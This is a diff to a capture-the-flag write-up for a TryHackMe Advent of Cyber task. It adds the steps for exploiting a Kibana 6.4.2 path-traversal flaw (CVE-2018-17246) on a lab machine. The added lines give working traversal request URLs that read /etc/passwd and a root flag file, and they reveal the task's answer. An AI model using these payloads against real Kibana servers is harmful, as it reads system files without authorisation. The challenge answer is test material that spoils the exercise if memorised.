@@ -1304,12 +1304,28 @@ In this task we only get some information about the target machine and that we n
    
    The version looks to be 6.4.2. Searching for an exploit yielded this result on [Github](https://github.com/mpgn/CVE-2018-17246).
    
-   Apparently we can use a path traversal exploit to look at the data on the machine. Let try with a file that probably will exist as a proof of concept.
+   Apparently we can use a path traversal exploit to look at the data on the machine. This was confirmed after navigating to the site via Burpsuite. Let try with a file that probably will exist as a proof of concept.
    
    ```cmd
-   
+   http://10.10.77.2:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../.../../../../etc/passwd
    ```
    
-   ![]()
+   ![Kibana Passwd](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2024/Stalk_Kibana_Path.png)
+   
+   The website seemed to be stuck. Maybe the log file can tell us something?
+   
+   ![Kibana Log Passwd](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2024/Stalk_Kibana_Log_Passwd.png)
+   
+   Here we can in fact see the contents of the `passwd` file. Lets try with the `root.txt` file.
+   
+   ```cmd
+   http://10.10.77.2:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../.../../../../root.txt
+   ```
+   
+   ![Kibana Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2024/Stalk_Kibana_Root.png)
+   
+   ![Kibana Log Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/25daysofchristmas/Day%2024/Stalk_Kibana_Log_Root.png)
+   
+   Hidden between the rest of the lines, we can see the contents of the file!
 
    ><details><summary>Click for answer</summary>someELKfun</details>
